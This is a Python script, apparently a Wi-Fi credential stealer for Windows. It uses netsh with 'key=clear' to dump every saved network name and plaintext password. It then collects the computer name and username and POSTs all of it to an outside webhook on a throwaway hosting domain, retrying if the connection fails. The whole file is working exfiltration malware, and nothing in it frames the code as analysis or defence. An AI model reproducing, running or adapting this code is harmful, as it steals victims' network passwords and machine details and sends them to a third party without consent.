import subprocess
import re
import os
import time

import requests


def get_wifi_profiles():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode('latin-1')
    profile_names = re.findall("All User Profile     : (.*)\r", command_output)
    wifi_list = []

    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {}
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name],
                                          capture_output=True).stdout.decode()

            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                                   capture_output=True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)

                if password is None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]

                wifi_list.append(wifi_profile)

    return wifi_list


# Retrieve WiFi profiles
wifi_list = get_wifi_profiles()

# Print WiFi profiles
for profile in wifi_list:
    print(profile)

# Save WiFi output to a text file
output_file_path = "wifi_output.txt"
with open(output_file_path, "w") as output_file:
    for profile in wifi_list:
        output_file.write(str(profile) + "\n")

# Get the PC name and username
pc_name = os.environ['COMPUTERNAME']
username = os.environ['USERNAME']

# Append computer and user info to the text file
with open(output_file_path, "a") as output_file:
    output_file.write(f"[Computer: {pc_name}]\n")
    output_file.write(f"Hostname: {pc_name}\n")
    output_file.write(f"Username: {username}\n")

# Read the contents of the file
with open(output_file_path, "r") as output_file:
    data_to_send = output_file.read()

# Sending data to the webhook with correct formatting
webhook_url = "https://pikminthrowaway1.000webhostapp.com/webhook.php"
formatted_data = f"[Type: PC Info] [Computer: {pc_name}]\n{data_to_send}"

response = requests.post(webhook_url, data=formatted_data, headers={'Content-Type': 'text/plain'})

max_retries = 3
retry_delay = 5  # seconds

for attempt in range(max_retries):
    try:
        response = requests.post(webhook_url, data=formatted_data, headers={'Content-Type': 'text/plain'})
        if response.status_code == 200:
            print('Webhook request sent successfully')
            break
    except requests.exceptions.ConnectTimeout:
        print(f'Retry attempt {attempt + 1}/{max_retries}. Connection timeout. Retrying in {retry_delay} seconds...')
        time.sleep(retry_delay)
else:
    print(f'Error sending webhook request after {max_retries} attempts.')
